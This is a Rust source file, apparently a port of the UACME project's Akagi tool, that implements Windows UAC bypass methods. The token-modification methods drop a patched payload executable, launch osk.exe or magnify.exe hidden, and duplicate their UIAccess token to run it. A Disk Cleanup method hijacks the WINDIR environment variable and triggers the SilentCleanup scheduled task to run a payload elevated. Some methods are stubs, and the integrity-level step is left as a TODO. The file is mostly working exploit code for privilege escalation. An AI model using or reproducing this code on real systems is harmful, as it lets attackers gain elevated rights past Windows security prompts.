// James Forshaw (Tyranid) UAC bypass methods
// Port of Source/Akagi/methods/tyranid.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Environment::*;
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;

/// Method 30: WOW64 Logger
/// Exploit WOW64 logger to gain SYSTEM privileges
pub fn method_wow64_logger(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 30] WOW64 Logger");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // WOW64 logger method requires:
    // 1. Drop Akatsuki DLL to system32
    // 2. Trigger WOW64 logger service
    // 3. DLL gets loaded as SYSTEM
    // 4. DLL creates process in user session
    
    log::warn!("WOW64 Logger method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 35: Token Modification
/// Modify token to bypass UAC
pub fn method_token_mod(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 35] Token Modification");
    
    // This method was deprecated
    constants::STATUS_NOT_SUPPORTED
}

/// Method 54: Token Modification with UI Access
/// Obtain token from UIAccess app and modify it
pub fn method_token_mod_ui_access(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 54] Token Modification with UI Access");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // This method:
    // 1. Spawns OSK.exe (has UIAccess)
    // 2. Opens its token
    // 3. Duplicates and modifies the token
    // 4. Creates process with modified token
    
    token_mod_ui_access_exec(
        ctx,
        payload_dll,
        "EntryPointUIAccessLoader",
        "osk.exe",
    )
}

/// Method 80: Token Modification with UI Access (variant 2)
pub fn method_token_mod_ui_access2(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 80] Token Modification with UI Access (v2)");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    token_mod_ui_access_exec(
        ctx,
        payload_dll,
        "EntryPointUIAccessLoader2",
        "magnify.exe",
    )
}

/// Execute token modification with UI Access
fn token_mod_ui_access_exec(
    ctx: &mut UacmeContext,
    proxy_dll: &[u8],
    entry_point_name: &str,
    ui_access_app: &str,
) -> MethodResult {
    use windows::Win32::Security::*;
    use std::fs;
    
    // Step 1: Patch DLL entry point and convert to EXE
    let mut modified_dll = proxy_dll.to_vec();

    // Patch DLL entry point
    if let Err(e) = pe_modifier::replace_dll_entry_point(
        &mut modified_dll,
        entry_point_name,
        true, // Convert to EXE
    ) {
        log::error!("Failed to patch DLL entry point: {}", e);
        return constants::STATUS_ACCESS_DENIED;
    }
    
    // Step 2: Drop modified payload to temp
    let temp_dir = from_wide_string(&ctx.temp_directory);
    let payload_path = format!("{}payload.exe", temp_dir);
    
    if let Err(e) = fs::write(&payload_path, &modified_dll) {
        log::error!("Failed to write payload: {}", e);
        return constants::STATUS_ACCESS_DENIED;
    }
    
    // Step 3: Spawn UI Access application (e.g., osk.exe)
    let sys_dir = from_wide_string(&ctx.system_directory);
    let ui_app_path = format!("{}{}", sys_dir, ui_access_app);
    
    unsafe {
        use windows::Win32::UI::Shell::*;
        
        let mut shinfo = SHELLEXECUTEINFOW {
            cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as u32,
            fMask: SEE_MASK_NOCLOSEPROCESS,
            lpFile: PCWSTR(to_wide_string(&ui_app_path).as_ptr()),
            nShow: SW_HIDE.0 as i32,
            ..Default::default()
        };
        
        if ShellExecuteExW(&mut shinfo).is_err() {
            log::error!("Failed to launch UI Access app");
            fs::remove_file(&payload_path).ok();
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let ui_process = shinfo.hProcess;
        
        // Step 4: Open process token
        let token_result = winapi_ext::TokenHandle::open_process_token(
            ui_process,
            TOKEN_DUPLICATE.0 | TOKEN_QUERY.0,
        );
        
        let token = match token_result {
            Ok(t) => t,
            Err(e) => {
                log::error!("Failed to open process token: {}", e);
                let _ = TerminateProcess(ui_process, 0);
                let _ = CloseHandle(ui_process);
                fs::remove_file(&payload_path).ok();
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        // Step 5: Duplicate token
        let dup_token = match token.duplicate_token(SecurityImpersonation.0 as u32) {
            Ok(t) => t,
            Err(e) => {
                log::error!("Failed to duplicate token: {}", e);
                let _ = TerminateProcess(ui_process, 0);
                let _ = CloseHandle(ui_process);
                fs::remove_file(&payload_path).ok();
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        // Step 6: Modify token integrity level to High
        // TODO: Implement token integrity modification
        
        // Step 7: Create process with modified token
        let session_id = winapi_ext::get_active_console_session_id();
        let mut payload_cmd = to_wide_string(&payload_path);
        
        match winapi_ext::create_process_as_user(
            dup_token.handle(),
            None,
            Some(&mut payload_cmd),
            None,
            session_id,
        ) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                
                // Cleanup
                let _ = TerminateProcess(ui_process, 0);
                let _ = CloseHandle(ui_process);
                std::thread::sleep(std::time::Duration::from_secs(2));
                fs::remove_file(&payload_path).ok();
                
                constants::STATUS_SUCCESS
            }
            Err(e) => {
                log::error!("Failed to create process as user: {}", e);
                let _ = TerminateProcess(ui_process, 0);
                let _ = CloseHandle(ui_process);
                fs::remove_file(&payload_path).ok();
                constants::STATUS_ACCESS_DENIED
            }
        }
    }
}

/// Disk Cleanup environment variable method
/// Works with AlwaysNotify UAC level
pub fn method_disk_cleanup_env(ctx: &mut UacmeContext, payload: &str) -> MethodResult {
    use windows::Win32::System::Environment::*;
    
    log::info!("[*] Disk Cleanup Environment Variable method");
    
    if payload.len() > 260 {
        return constants::STATUS_INVALID_PARAMETER;
    }
    
    unsafe {
        // Build environment variable value with quotes
        let quote_fix = ctx.build_number >= constants::NT_WIN10_21H2;
        let env_value = if quote_fix {
            format!("\"{}\"", payload)
        } else {
            format!("\"{}\"", payload)
        };
        
        let env_value_wide = to_wide_string(&env_value);
        let windir_wide = to_wide_string("windir");
        
        // Set WINDIR environment variable to our payload
        if SetEnvironmentVariableW(
            PCWSTR(windir_wide.as_ptr()),
            PCWSTR(env_value_wide.as_ptr()),
        ).is_err() {
            log::error!("Failed to set environment variable");
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Trigger scheduled task
        let result = if start_scheduled_task("\\Microsoft\\Windows\\DiskCleanup", "SilentCleanup") {
            constants::STATUS_SUCCESS
        } else {
            constants::STATUS_ACCESS_DENIED
        };
        
        // Cleanup: remove environment variable
        let _ = SetEnvironmentVariableW(
            PCWSTR(windir_wide.as_ptr()),
            PCWSTR(std::ptr::null()),
        );
        
        result
    }
}

/// Start a scheduled task
fn start_scheduled_task(task_path: &str, task_name: &str) -> bool {
    // This requires Task Scheduler COM interface
    // For now, simplified implementation using schtasks.exe
    
    let command = format!("schtasks.exe /Run /TN \"{}\\{}\"", task_path, task_name);
    
    match winapi_ext::create_process_simple(&to_wide_string(&command), None, 1) {
        Ok(pi) => {
            unsafe {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
            }
            true
        }
        Err(_) => false,
    }
}

